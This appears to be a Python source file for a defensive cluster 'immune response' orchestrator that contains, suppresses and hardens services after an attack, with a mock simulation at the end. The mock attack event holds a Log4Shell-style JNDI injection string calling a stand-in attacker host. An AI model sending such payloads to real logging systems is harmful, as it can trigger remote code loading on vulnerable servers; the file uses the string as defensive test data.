import sys
import os
# Adjust sys.path to include project root
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from typing import Dict, Tuple, List, Optional, Any
import numpy as np
from hierarchical_control.hierarchical_policy_engine import HierarchicalPolicyEngine
from adaptive_security.evolutionary_agent import EvolutionaryAgent
from proactive_remediation.attack_pattern_analyzer import AttackPatternAnalyzer
from proactive_remediation.cluster_scanner import ClusterScanner, MOCK_CLUSTER_METADATA
from proactive_remediation.proactive_patcher import ProactivePatcher

# ----------------------------------------------------------------------
# 1. CORE COMPONENT: ImmuneSurveillanceSystem (Orchestrator)
# ----------------------------------------------------------------------

class ImmuneSurveillanceSystem:
    """
    Coordinates the adaptive immune response from attack recognition to system-wide hardening.
    """
    def __init__(self, rl_agent: EvolutionaryAgent, cluster_metadata: List[Dict[str, Any]]):
        # Initialize sub-components
        self.analyzer = AttackPatternAnalyzer(critical_q_threshold=100.0)
        self.scanner = ClusterScanner(cluster_metadata=cluster_metadata)
        self.patcher = ProactivePatcher()
        self.rl_agent = rl_agent

    def respond_to_attack(self, initial_attack_event: Dict, initial_service_id: str, engine_map: Dict[str, HierarchicalPolicyEngine]) -> Dict:
        """
        Executes the 5-phase Adaptive Immune Response.
        """
        response_summary = {"attacked_service": initial_service_id, "hardened_services": [], "action_flow": []}

        # --- Phase 1: Recognition & Containment (On Attacked Host) ---
        print("\n--- Phase 1: Recognition & Immediate Containment ---")
        
        # 1.1 Immediate Suppression on the attacked host (RL Agent's decision enforced)
        if initial_service_id in engine_map:
            engine = engine_map[initial_service_id]
            attack_path = initial_attack_event['path']
            engine.suppress_path(attack_path)
            self.patcher._simulate_network_isolation(initial_service_id)
            response_summary["action_flow"].append(f"P1: {initial_service_id} immediately suppressed and isolated.")
        else:
            print("[ERROR] Initial service not found in engine map.")
            return response_summary

        # --- Phase 2: Pattern Analysis (Antigen Characterization) ---
        print("\n--- Phase 2: Pattern Analysis (Signature Extraction) ---")
        
        # 2.1 Analyze the event and RL's learned policy to generate a signature
        signature = self.analyzer.analyze_attack_event(initial_attack_event, self.rl_agent)
        if not signature:
            print("[WARNING] RL Q-Value too low or signature incomplete. Aborting proactive scan.")
            return response_summary
            
        response_summary["action_flow"].append(f"P2: Signature extracted (Path: {signature['vulnerable_path']}, Indicators: {signature['static_indicators']}).")

        # --- Phase 3: System-wide Scan (Immune Surveillance) ---
        print("\n--- Phase 3: System-wide Scan (Finding Susceptible Targets) ---")
        
        # 3.1 Identify other containers vulnerable to this signature
        vulnerable_targets = self.scanner.scan_cluster(signature)
        
        if not vulnerable_targets:
            print("[INFO] No other susceptible targets found based on library version/path exposure.")
        
        response_summary["action_flow"].append(f"P3: {len(vulnerable_targets)} susceptible targets identified.")

        # --- Phase 4: Prophylactic Hardening ( 선제적 강화 / Repair) ---
        print("\n--- Phase 4: Prophylactic Hardening (Epigenetic Repair) ---")
        
        # 4.1 Apply the epigenetic suppression tag to the newly identified services
        hardened_ids = self.patcher.apply_prophylactic_patch(vulnerable_targets, engine_map)
        response_summary["hardened_services"].extend(hardened_ids)
        response_summary["action_flow"].append(f"P4: Applied suppression to {len(hardened_ids)} new services.")
        
        # --- Phase 5: Immune Memory & Transduction ---
        print("\n--- Phase 5: Immune Memory & Transduction ---")
        
        # 5.1 Propagate the newly hardened policy to neighborhood services (Simulated HGT)
        # Note: In a full implementation, only the changes would be propagated.
        
        # We simulate the infected service (LogService) sharing its immunity
        source_engine = engine_map[initial_service_id]
        
        for service_id, target_engine in engine_map.items():
            if service_id != initial_service_id:
                # Transduction: Target engine acquires immunity from the source
                target_engine.transduce_immunity(source_engine)
                print(f"   [TRANSDUCTION]: {initial_service_id} shared immunity trait with {service_id}.")

        response_summary["action_flow"].append("P5: Immunity propagated cluster-wide via Transduction.")
        
        return response_summary

# ----------------------------------------------------------------------
# 2. FINAL SIMULATION EXAMPLE (Full Loop)
# ----------------------------------------------------------------------

if __name__ == "__main__":
    print("=====================================================================")
    print("      🧬 IMMUNE SURVEILLANCE SYSTEM (FULL ADAPTIVE LOOP) START")
    print("=====================================================================")

    # --- 1. MOCK ENVIRONMENT SETUP ---
    # We need all component dependencies for this test.
    # Note: HierarchicalPolicyEngine provides the necessary Transduce/Allow/Suppress methods.

    # 1.1 Initialize Engines (The cluster's policies)
    billing_engine = HierarchicalPolicyEngine()
    inventory_engine = HierarchicalPolicyEngine()
    log_engine = HierarchicalPolicyEngine()
    
    # Simulating the initial allowed paths for testing
    billing_engine.allow_path("payload.content") # Vulnerable path open
    log_engine.allow_path("payload.content")     # Vulnerable path open
    inventory_engine.allow_path("item.sku")      # Safe path open

    engine_ssot_map = {
        "BillingService": billing_engine, # Vulnerable version assumed in scanner
        "InventoryService": inventory_engine, # Safe version assumed
        "LogService": log_engine # Vulnerable version assumed in scanner
    }
    
    # 1.2 Mock RL Agent (Already trained to block this specific attack)
    mock_rl_agent = EvolutionaryAgent(billing_engine) 
    # Manually setting a high Q-Value for the attack state 
    high_threat_features = {
        'anomaly_score': 0.9,
        'entropy': 0.9,
        'frequency': 0.2
    }
    high_threat_state = mock_rl_agent.get_state("payload.content", high_threat_features)
    mock_rl_agent.q_table[high_threat_state] = np.array([-50.0, 150.0]) # SUPPRESS Q=150.0

    # 1.3 Mock Initial Attack Event (LogService is the initial point of failure)
    initial_attack = {
        "path": "payload.content",
        "payload_sample": "Logging ${jndi:ldap://attacker.com/a}",
        "features": {"anomaly": 0.95, "entropy": 0.90, "frequency": 0.10}
    }
    
    # --- 2. EXECUTE IMMUNE RESPONSE ---
    
    system = ImmuneSurveillanceSystem(mock_rl_agent, MOCK_CLUSTER_METADATA)
    
    print("\n[ATTACK]: LogService detected intrusion on 'payload.content'. Initiating Full Response.")
    
    response = system.respond_to_attack(initial_attack, "LogService", engine_ssot_map)

    # --- 3. FINAL VERIFICATION ---
    
    print("\n=====================================================================")
    print("      FINAL VERIFICATION: PROPHYLACTIC HARDENING CHECK")
    print("=====================================================================")
    
    # Expected: LogService was immediately suppressed (P1). BillingService was prophylactically suppressed (P4).
    
    status_log = log_engine.check_access('payload.content')
    status_billing = billing_engine.check_access('payload.content')
    status_inventory = inventory_engine.check_access('payload.content')
    
    print(f"1. LogService (Attacked Host): {status_log}")
    print(f"2. BillingService (Susceptible Target): {status_billing}")
    print(f"3. InventoryService (Non-Target): {status_inventory}")
    
    if status_log == "BLOCKED_SUPPRESSED" and status_billing == "BLOCKED_SUPPRESSED":
        print("\n✅ SUCCESS: Full Adaptive Loop Completed.")
        print("   LogService was contained, and BillingService was proactively hardened (P4).")
        
    print("\nSUMMARY:")
    for action in response["action_flow"]:
        print(f"-> {action}")